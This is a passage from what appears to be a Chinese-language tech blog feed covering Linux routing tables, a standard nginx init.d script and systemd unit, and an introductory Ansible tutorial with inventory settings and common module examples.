<br></code></pre></td></tr></table></figure><p>系统默认有三个路由表</p><p>Linux最多可以支持255张路由表，其中有3张表是内置的：<br>　　表255 本地路由表（Local table） 本地接口地址，广播地址，已及NAT地址都放在这个表。该路由表由系统自动维护，管理员不能直接修改。<br>　　表254 主路由表（Main table） 如果没有指明路由所属的表，所有的路由都默认都放在这个表里，一般来说，旧的路由工具（如route）所添加的路由都会加到这个表。一般是普通的路由。</p><p>​表253 默认路由表 （Default table） 一般来说默认的路由都放在这张表，但是如果特别指明放的也可以是所有的网关路由。</p><p>查看路由规则内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip route list table table_number<br></code></pre></td></tr></table></figure><p>添加规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip route add from ipaddress/netprefix  table table_num pref <span class="hljs-comment">#匹配该ip地址段的流量按路由表table_num处理</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux基本工具的使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux常用的服务启动工具的原理</title>
    <link href="/2022/08/05/linux%E5%B8%B8%E7%94%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E5%8E%9F%E7%90%86/"/>
    <url>/2022/08/05/linux%E5%B8%B8%E7%94%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="linux常用的服务工具的原理"><a href="#linux常用的服务工具的原理" class="headerlink" title="linux常用的服务工具的原理"></a>linux常用的服务工具的原理</h1><h3 id="1-openrc-x2F-service"><a href="#1-openrc-x2F-service" class="headerlink" title="1.openrc&#x2F;service"></a>1.openrc&#x2F;service</h3><p>通过读取&#x2F;etc&#x2F;init.d&#x2F;*脚本,这个脚本定义了程序的执行规则,停止规则等.</p><p>以nginx服务的服务脚本为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## BEGIN INIT INFO</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Provides:  nginx</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Required-Start:    <span class="hljs-variable">$local_fs</span> <span class="hljs-variable">$remote_fs</span> <span class="hljs-variable">$network</span> <span class="hljs-variable">$syslog</span> <span class="hljs-variable">$named</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Required-Stop:     <span class="hljs-variable">$local_fs</span> <span class="hljs-variable">$remote_fs</span> <span class="hljs-variable">$network</span> <span class="hljs-variable">$syslog</span> <span class="hljs-variable">$named</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Default-Start:     2 3 4 5</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Default-Stop:      0 1 6</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Short-Description: starts the nginx web server</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Description:       starts nginx using start-stop-daemon</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## END INIT INFO</span></span><br><br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br>DAEMON=/usr/sbin/nginx<br>NAME=nginx<br>DESC=nginx<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Include nginx defaults <span class="hljs-keyword">if</span> available</span><br>if [ -r /etc/default/nginx ]; then<br>. /etc/default/nginx<br>fi<br><br>STOP_SCHEDULE=&quot;$&#123;STOP_SCHEDULE:-QUIT/5/TERM/5/KILL/5&#125;&quot;<br><br>test -x $DAEMON || exit 0<br><br>. /lib/init/vars.sh<br>. /lib/lsb/init-functions<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Try to extract nginx pidfile</span><br>PID=$(cat /etc/nginx/nginx.conf | grep -Ev &#x27;^\s*#&#x27; | awk &#x27;BEGIN &#123; RS=&quot;[;&#123;&#125;]&quot; &#125; &#123; if ($1 == &quot;pid&quot;) print $2 &#125;&#x27; | head -n1)<br>if [ -z &quot;$PID&quot; ]; then<br>PID=/run/nginx.pid<br>fi<br><br>if [ -n &quot;$ULIMIT&quot; ]; then<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Set <span class="hljs-built_in">ulimit</span> <span class="hljs-keyword">if</span> it is <span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span> /etc/default/nginx</span><br>ulimit $ULIMIT<br>fi<br><br>start_nginx() &#123;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Start the daemon/service</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># Returns:</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  0 <span class="hljs-keyword">if</span> daemon has been started</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  1 <span class="hljs-keyword">if</span> daemon was already running</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  2 <span class="hljs-keyword">if</span> daemon could not be started</span><br>start-stop-daemon --start --quiet --pidfile $PID --exec $DAEMON --test &gt; /dev/null \<br>|| return 1<br>start-stop-daemon --start --quiet --pidfile $PID --exec $DAEMON -- \<br><span class="hljs-meta prompt_">$</span><span class="language-bash">DAEMON_OPTS 2&gt;/dev/null \</span><br><span class="language-bash">|| <span class="hljs-built_in">return</span> 2</span><br>&#125;<br><br>test_config() &#123;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Test the nginx configuration</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">DAEMON -t <span class="hljs-variable">$DAEMON_OPTS</span> &gt;/dev/null 2&gt;&amp;1</span><br>&#125;<br><br>stop_nginx() &#123;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Stops the daemon/service</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># Return</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  0 <span class="hljs-keyword">if</span> daemon has been stopped</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  1 <span class="hljs-keyword">if</span> daemon was already stopped</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  2 <span class="hljs-keyword">if</span> daemon could not be stopped</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  other <span class="hljs-keyword">if</span> a failure occurred</span><br>start-stop-daemon --stop --quiet --retry=$STOP_SCHEDULE --pidfile $PID --name $NAME<br>RETVAL=&quot;$?&quot;<br>sleep 1<br>return &quot;$RETVAL&quot;<br>&#125;<br><br>reload_nginx() &#123;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Function that sends a SIGHUP to the daemon/service</span><br>start-stop-daemon --stop --signal HUP --quiet --pidfile $PID --name $NAME<br>return 0<br>&#125;<br><br>rotate_logs() &#123;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Rotate <span class="hljs-built_in">log</span> files</span><br>start-stop-daemon --stop --signal USR1 --quiet --pidfile $PID --name $NAME<br>return 0<br>&#125;<br><br>upgrade_nginx() &#123;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Online upgrade nginx executable</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">http://nginx.org/en/docs/control.html</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># Return</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  0 <span class="hljs-keyword">if</span> nginx has been successfully upgraded</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  1 <span class="hljs-keyword">if</span> nginx is not running</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  2 <span class="hljs-keyword">if</span> the pid files were not created on time</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  3 <span class="hljs-keyword">if</span> the old master could not be killed</span><br>if start-stop-daemon --stop --signal USR2 --quiet --pidfile $PID --name $NAME; then<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Wait <span class="hljs-keyword">for</span> both old and new master to write their pid file</span><br>while [ ! -s &quot;$&#123;PID&#125;.oldbin&quot; ] || [ ! -s &quot;$&#123;PID&#125;&quot; ]; do<br>cnt=`expr $cnt + 1`<br>if [ $cnt -gt 10 ]; then<br>return 2<br>fi<br>sleep 1<br>done<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Everything is ready, gracefully stop the old master</span><br>if start-stop-daemon --stop --signal QUIT --quiet --pidfile &quot;$&#123;PID&#125;.oldbin&quot; --name $NAME; then<br>return 0<br>else<br>return 3<br>fi<br>else<br>return 1<br>fi<br>&#125;<br><br>case &quot;$1&quot; in<br>start)<br>log_daemon_msg &quot;Starting $DESC&quot; &quot;$NAME&quot;<br>start_nginx<br>case &quot;$?&quot; in<br>0|1) log_end_msg 0 ;;<br>2)   log_end_msg 1 ;;<br>esac<br>;;<br>stop)<br>log_daemon_msg &quot;Stopping $DESC&quot; &quot;$NAME&quot;<br>stop_nginx<br>case &quot;$?&quot; in<br>0|1) log_end_msg 0 ;;<br>2)   log_end_msg 1 ;;<br>esac<br>;;<br>restart)<br>log_daemon_msg &quot;Restarting $DESC&quot; &quot;$NAME&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Check configuration before stopping nginx</span><br>if ! test_config; then<br>log_end_msg 1 # Configuration error<br>exit $?<br>fi<br><br>stop_nginx<br>case &quot;$?&quot; in<br>0|1)<br>start_nginx<br>case &quot;$?&quot; in<br>0) log_end_msg 0 ;;<br>1) log_end_msg 1 ;; # Old process is still running<br>*) log_end_msg 1 ;; # Failed to start<br>esac<br>;;<br>*)<br># Failed to stop<br>log_end_msg 1<br>;;<br>esac<br>;;<br>reload|force-reload)<br>log_daemon_msg &quot;Reloading $DESC configuration&quot; &quot;$NAME&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Check configuration before stopping nginx</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># This is not entirely correct since the on-disk nginx binary</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">may differ from the in-memory one, but that<span class="hljs-string">&#x27;s not common.</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">We prefer to check the configuration and return an error</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">to the administrator.</span></span><br>if ! test_config; then<br>log_end_msg 1 # Configuration error<br>exit $?<br>fi<br><br>reload_nginx<br>log_end_msg $?<br>;;<br>configtest|testconfig)<br>log_daemon_msg &quot;Testing $DESC configuration&quot;<br>test_config<br>log_end_msg $?<br>;;<br>status)<br>status_of_proc -p $PID &quot;$DAEMON&quot; &quot;$NAME&quot; &amp;&amp; exit 0 || exit $?<br>;;<br>upgrade)<br>log_daemon_msg &quot;Upgrading binary&quot; &quot;$NAME&quot;<br>upgrade_nginx<br>log_end_msg $?<br>;;<br>rotate)<br>log_daemon_msg &quot;Re-opening $DESC log files&quot; &quot;$NAME&quot;<br>rotate_logs<br>log_end_msg $?<br>;;<br>*)<br>echo &quot;Usage: $NAME &#123;start|stop|restart|reload|force-reload|status|configtest|rotate|upgrade&#125;&quot; &gt;&amp;2<br>exit 3<br>;;<br>esac<br></code></pre></td></tr></table></figure><p>使用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">rc-service sshd start<br>service ssh start|status|stop|restart<br></code></pre></td></tr></table></figure><h3 id="2-systemd"><a href="#2-systemd" class="headerlink" title="2.systemd"></a>2.systemd</h3><p>systemd是大部分linux发行版采用的init程序,作为一种init程序,操作系统启动的时候systemd会启动一个后台守护进行systemd,systemd每启动一个服务,是通过从systemd fork一个子进程,启动服务的过程中systemd通过读取&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;*.service文件脚本,从而获得可执行程序的路径,启动程序参数等等…</p><p>以nginx.service服务管理脚本为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Stop dance <span class="hljs-keyword">for</span> nginx</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">=======================</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># ExecStop sends SIGSTOP (graceful stop) to the nginx process.</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">If, after 5s (--retry QUIT/5) nginx is still running, systemd takes control</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">and sends SIGTERM (fast shutdown) to the main process.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">After another 5s (TimeoutStopSec=5), and <span class="hljs-keyword">if</span> nginx is alive, systemd sends</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">SIGKILL to all the remaining processes <span class="hljs-keyword">in</span> the process group (KillMode=mixed).</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># nginx signals reference doc:</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">http://nginx.org/en/docs/control.html</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash">[Unit]</span><br>Description=A high performance web server and a reverse proxy server<br>Documentation=man:nginx(8)<br>After=network.target nss-lookup.target<br><br>[Service]<br>Type=forking<br><span class="hljs-meta prompt_">#</span><span class="language-bash">进程</span><br>PIDFile=/run/nginx.pid<br>ExecStartPre=/usr/sbin/nginx -t -q -g &#x27;daemon on; master_process on;&#x27;<br>ExecStart=/usr/sbin/nginx -g &#x27;daemon on; master_process on;&#x27;<br>ExecReload=/usr/sbin/nginx -g &#x27;daemon on; master_process on;&#x27; -s reload<br>ExecStop=-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /run/nginx.pid<br>TimeoutStopSec=5<br>KillMode=mixed<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start|stop|reload nginx.service #启动/停止服务<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置及原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ansible自动化运维入门</title>
    <link href="/2022/07/28/ansible%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4%E5%85%A5%E9%97%A8/"/>
    <url>/2022/07/28/ansible%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ansible自动化运维入门"><a href="#ansible自动化运维入门" class="headerlink" title="ansible自动化运维入门"></a>ansible自动化运维入门</h1><h4 id="1-ansible是什么"><a href="#1-ansible是什么" class="headerlink" title="1.ansible是什么?"></a>1.ansible是什么?</h4><p>Ansible是一个开源配置管理工具，可以使用它来自动化任务，部署应用程序实现IT基础架构。ansible基于python开发,提供了多种运维模块, Ansible可以用来自动化日常任务，比如，服务器的初始化配置、安全基线配置、更新和打补丁系统，安装软件包等,而且ansible配置十分简单,被控制机器只需要支持ssh登录即可被ansible进行管理,无需安装其他的agent,对于传统的运维方式,ansible大大提高了同时管理多台服务器的运维效率</p><h4 id="2-ansible配置"><a href="#2-ansible配置" class="headerlink" title="2.ansible配置"></a>2.ansible配置</h4><p>基于ubuntu20.04(管理服务器)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install ansible<br></code></pre></td></tr></table></figure><p>配置运维机器列表清单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/ansible/hosts<br>[mywebserver]<br>192.168.0.5 ansible_user=root ansible_ssh_private_key_file=<span class="hljs-variable">$HOME</span>/.ssh/private_keys/armbian<br></code></pre></td></tr></table></figure><p>常用的配置参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible_connection <span class="hljs-comment">#主机连接类型，这可以是任何 ansible 连接插件的名称，如 smart、ssh、paramiko、local</span><br>ansible_ssh_host <span class="hljs-comment"># 将要连接的远程主机名.与你想要设定的主机的别名不同的话,可通过此变量设置.</span><br>ansible_ssh_port <span class="hljs-comment"># 连接端口号（默认22）</span><br>ansible_ssh_user <span class="hljs-comment"># 连接主机时的用户名</span><br>ansible_ssh_pass <span class="hljs-comment"># 用于验证主机的密码</span><br>ansible_ssh_private_key_file <span class="hljs-comment"># ssh 使用的私钥文件.适用于有多个密钥,而你不想使用 SSH 代理的情况.</span><br>ansible_ssh_common_args <span class="hljs-comment"># 此设置附加到 sftp，scp 和 ssh 的缺省命令行</span><br>ansible_sftp_extra_args <span class="hljs-comment"># 此设置附加到默认 sftp 命令行</span><br>ansible_scp_extra_args <span class="hljs-comment"># 此设置附加到默认 scp 命令行</span><br>ansible_ssh_extra_args <span class="hljs-comment"># 此设置附加到默认 ssh 命令行</span><br>ansible_ssh_pipelining <span class="hljs-comment"># 确定是否使用 SSH 管道。 这可以覆盖 ansible.cfg 中得设置</span><br>ansible_shell_type <span class="hljs-comment"># 目标系统的 shell 类型，默认情况下命令的执行使用 &#x27;sh&#x27; 语法,可设置为 &#x27;csh&#x27; 或 &#x27;fish&#x27;</span><br>ansible_python_interpreter <span class="hljs-comment"># 目标主机的 python 路径，适用于的情况: 系统中有多个 Python, 或者命令路径不是&quot;/usr/bin/python&quot;,比如 *BSD, 或者 /usr/bin/python</span><br>ansible_interpreter <span class="hljs-comment"># 这里的&quot;&quot;可以是 ruby、perl 或其他语言的解释器，作用和ansible_python_interpreter 类似</span><br>ansible_shell_executable <span class="hljs-comment"># 这将设置 ansible 控制器将在目标机器上使用的 shell，覆盖 ansible.cfg 中的配置，默认为 /bin/sh</span><br></code></pre></td></tr></table></figure><h4 id="3-实现远程服务器批量管理的模式"><a href="#3-实现远程服务器批量管理的模式" class="headerlink" title="3.实现远程服务器批量管理的模式"></a>3.实现远程服务器批量管理的模式</h4><h5 id="1-ad-hoc模式"><a href="#1-ad-hoc模式" class="headerlink" title="1.ad-hoc模式"></a>1.ad-hoc模式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible-doc -s module_name<span class="hljs-comment">#查看该模块支持的参数</span><br>ansible-doc -l <span class="hljs-comment">#查看可用的模块</span><br><span class="hljs-comment">#使用方法</span><br>ansible SERVERLIST -m <span class="hljs-variable">$MODULE_NAME</span> -a <span class="hljs-variable">$ARGS</span><br></code></pre></td></tr></table></figure><h4 id="4-ansible常用的模块"><a href="#4-ansible常用的模块" class="headerlink" title="4.ansible常用的模块"></a>4.ansible常用的模块</h4><p><strong>1.command模块</strong></p><p>向远程主机执行命令 (不支持管道符)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chdir</span> 执行命令之前切换到指定目录<br>creates 执行命令命令前判断文件是否存在,如果存在则不执行前面的命令<br>removes 执行一个命令前判断指定的文件是否存在,如果存在执行前面的操作<br></code></pre></td></tr></table></figure><p><strong>2.shell模块</strong></p><p>shell模块基本和command相同，但是shell支持管道符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible mywebserver -m shell -a <span class="hljs-string">&quot;/home/test.sh&quot;</span> <span class="hljs-comment">#在远程主机上执行远程主机的脚本(test.sh脚本在远程服务器)</span><br></code></pre></td></tr></table></figure><p><strong>3.script模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible mywebserver -m script -a <span class="hljs-string">&quot;/home/test.sh&quot;</span> <span class="hljs-comment">#在远程主机上执行本地的脚本(test.sh脚本在主控端本地)</span><br></code></pre></td></tr></table></figure><p><strong>4.copy模块</strong></p><p>实现主控端向目标主机拷贝文件,类似于scp功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible mywebserver -m copy -a <span class="hljs-string">&quot;src=/home/test.sh dst=/tmp/test.sh owner=root group=root mode=0755&quot;</span><br></code></pre></td></tr></table></figure><p><strong>5.stat模块</strong></p><p>获取远程文件的状态信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible mywebserver -m <span class="hljs-built_in">stat</span> -a <span class="hljs-string">&quot;path=/etc/hosts&quot;</span><br></code></pre></td></tr></table></figure><p><strong>6.get_url</strong></p><p>实现远程主机下载指定url文件到远程主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible mywebserver -m get_url <span class="hljs-string">&quot;url=https://www.baidu.com dst=/tmp/index.html mode=0444 force=yes&quot;</span><br></code></pre></td></tr></table></figure><p><strong>7.yum</strong></p><p>实现调用远程主机的yum包管理器下载指定的软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible mywebserver -m yum -a <span class="hljs-string">&quot;name=kubernetes-master state=latest&quot;</span><br></code></pre></td></tr></table></figure><p><strong>8.crontab</strong></p><p>配置远程主机的计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible mywebserver -m cron -a <span class="hljs-string">&quot;name=mywebserver  hour=&#x27;5,2&#x27; job=&#x27;ls -alh &gt; /dev/null&#x27;&quot;</span><span class="hljs-comment">#name为crontab中的注释</span><br></code></pre></td></tr></table></figure><p><strong>9.mount</strong></p><p>远程主机分区挂载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible mywebserver -m mount -a <span class="hljs-string">&quot;name=/mnt/data src=/dev/sda1 fstype=ext4 opts=ro state=present&quot;</span><br></code></pre></td></tr></table></figure><p><strong>10.service</strong></p><p>对远程主机服务进行管理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible mywebserver -m service -a <span class="hljs-string">&quot;name=nginx state=started|reloaded|stopped&quot;</span><br></code></pre></td></tr></table></figure><p><strong>11.user</strong></p><p>远程主机用户管理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible mywebserver -m user -a <span class="hljs-string">&quot;name=centos comment=&#x27;user&#x27;&quot;</span><br></code></pre></td></tr></table></figure><h5 id="2-palybook模式"><a href="#2-palybook模式" class="headerlink" title="2.palybook模式"></a>2.palybook模式</h5><p>playbook模式是使用yaml文件格式将命令指定的参数以及目标类似于清单一样的描述下来</p><p>实例清单</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span 